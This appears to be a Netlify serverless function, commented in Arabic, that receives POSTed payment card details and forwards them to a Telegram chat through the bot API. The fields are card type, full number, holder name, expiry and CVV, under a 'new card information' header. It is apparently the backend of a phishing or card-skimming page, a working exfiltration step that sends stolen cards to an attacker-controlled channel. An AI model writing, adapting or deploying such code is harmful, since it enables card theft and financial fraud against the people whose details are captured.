// netlify/functions/send-card.js
exports.handler = async (event) => {
    // نسمح فقط بطلبات POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    // التوكن ومعرف الدردشة من متغيرات البيئة (سنضبطها في Netlify لاحقًا)
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'إعدادات الخادم غير مكتملة' })
        };
    }

    try {
        const cardData = JSON.parse(event.body);

        // بناء الرسالة بنفس التنسيق السابق
        const message = `💳 *معلومات بطاقة جديدة* \n\n` +
            `🏷️ *النوع:* ${cardData.type}\n` +
            `🔢 *الرقم:* \`${cardData.number}\`\n` +
            `👤 *الحامل:* ${cardData.holder}\n` +
            `📅 *الانتهاء:* ${cardData.expiry}\n` +
            `🔐 *CVV:* \`${cardData.cvv}\`\n\n` +
            `🕒 _${new Date().toLocaleString('ar-SA')}_`;

        // إرسال إلى تيليجرام
        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();

        if (!data.ok) {
            throw new Error(data.description || 'فشل إرسال الرسالة إلى تيليجرام');
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        console.error('خطأ في دالة send-card:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
